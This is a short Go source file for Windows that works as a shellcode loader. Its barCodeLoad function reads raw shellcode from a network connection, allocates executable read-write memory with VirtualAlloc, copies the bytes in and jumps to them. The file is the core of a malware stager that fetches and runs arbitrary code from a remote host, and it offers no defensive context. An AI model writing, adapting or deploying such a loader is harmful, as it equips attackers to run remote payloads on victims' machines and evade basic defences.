package main

import (
	"fmt"
	"log"
	"net"
	"unsafe"

	"golang.org/x/sys/windows"
)

func barCodeLoad(conn *net.Conn) { //Works with x64 only.
	fmt.Println("Getting the shellcode")
	buff := make([]byte, 100000)
	read_len, err := (*conn).Read(buff)
	if read_len <= 1 {
		fmt.Println("Failed to read shellcode")
	}
	if err != nil {
		fmt.Println("Failed to read shellcode")
	}
	buffSnapped := buff[:read_len]
	//strBuff := string(buffSnapped)
	executableMemory, err := windows.VirtualAlloc(0, uintptr(len(buffSnapped)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		log.Fatal("Fail allocating executable memory: ", err)
	}

	WriteMemory(buffSnapped, executableMemory)

	memoryPtr := &executableMemory
	ptr := unsafe.Pointer(&memoryPtr)
	shellcodeFunc := *(*func())(ptr)
	//Try to run this concurently with goroutine ?!
	shellcodeFunc()

}

func WriteMemory(inbuf []byte, destination uintptr) {
	for index := uint32(0); index < uint32(len(inbuf)); index++ {
		writePtr := unsafe.Pointer(destination + uintptr(index))
		v := (*byte)(writePtr)
		*v = inbuf[index]
	}
}
